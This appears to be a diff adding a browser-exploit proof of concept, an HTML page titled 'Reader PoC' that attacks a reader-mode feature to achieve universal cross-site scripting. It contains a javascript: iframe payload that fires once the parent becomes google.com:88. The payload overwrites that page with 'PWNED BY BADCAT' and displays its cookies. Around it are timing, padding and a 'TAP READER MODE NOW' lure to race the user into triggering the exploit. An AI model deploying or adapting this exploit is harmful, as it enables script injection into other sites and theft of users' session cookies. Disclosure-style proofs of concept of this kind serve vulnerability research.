@@ -1,0 +1,74 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Reader PoC</title>
+  <style>
+    :root { color-scheme: light dark; }
+    body {
+      margin: 0;
+      font-family: system-ui, sans-serif;
+    }
+    #source { max-width: 760px; margin: 24px auto; line-height: 1.45; }
+    #cover {
+      position: fixed;
+      inset: 0;
+      z-index: 10;
+      display: grid;
+      place-items: center;
+      background: Canvas;
+    }
+    #cue {
+      padding: 18px 28px;
+      border: 0;
+      border-radius: 14px;
+      background: #555;
+      color: #fff;
+      font: 700 20px system-ui, sans-serif;
+      opacity: 1;
+    }
+    #cue.go { background: #c00020; }
+    iframe { width: 1px; height: 1px; border: 0; }
+  </style>
+</head>
+<body>
+  <article id="source">
+    <iframe
+      class="mercury-parser-keep"
+      src="javascript:(()=>{if(parent.location.origin==='https://www.google.com:88'){let s=parent.document.createElement('script');s.textContent=&quot;document.open();document.write('<!doctype html><title>UXSS '+document.domain+'</title><h1>PWNED BY BADCAT</h1><br><img src=https://i.giphy.com/Smx2SK5xnY9OpDHRqL.webp><br><p id=uxss-proof>domain='+document.domain+' top='+(window===top)+' cookie:'+document.cookie+'</p>');document.close();alert(document.domain)&quot;;parent.document.head.appendChild(s)}})()">
+    </iframe>
+    <p id="padding"></p>
+  </article>
+
+  <div id="cover">
+    <button id="cue" type="button" disabled>WAIT</button>
+  </div>
+
+  <script>
+  (() => {
+    const params = new URLSearchParams(location.search);
+    const number = (name, fallback, min, max) => {
+      const value = Number(params.get(name));
+      return Number.isFinite(value) ? Math.min(max, Math.max(min, value)) : fallback;
+    };
+
+    const delay = number('delay', 15000, 5000, 60000);
+    const lead = number('lead', 500, 100, 1200);
+    const cue = document.querySelector('#cue');
+
+    document.querySelector('#padding').textContent =
+      'Reader extraction padding keeps article conversion busy. '.repeat(19000);
+
+    setTimeout(() => {
+      cue.textContent = 'TAP READER MODE NOW';
+      cue.classList.add('go');
+    }, delay - lead);
+
+    setTimeout(() => {
+      location.assign('https://www.google.com:88');
+    }, delay);
+  })();
+  </script>
+</body>
+</html>
